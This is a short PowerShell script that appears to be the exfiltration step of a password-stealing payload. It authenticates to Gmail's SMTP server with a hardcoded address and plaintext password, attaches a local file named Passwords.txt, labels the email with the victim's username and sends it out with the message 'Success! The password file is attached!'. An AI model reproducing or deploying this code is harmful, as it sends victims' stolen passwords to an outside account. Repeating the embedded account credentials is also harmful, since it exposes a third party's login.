$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('riivenoliveira@gmail.com', 'senhafacil123321')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'riivenoliveira@gmail.com'
$E.To.Add('riivenoliveira@gmail.com')
$E.Subject = $env:UserName
$E.Body = 'Success! The password file is attached!'
$F = "Passwords.txt"
$E.Attachments.Add($F)
$SMTPInfo.Send($E)
exit
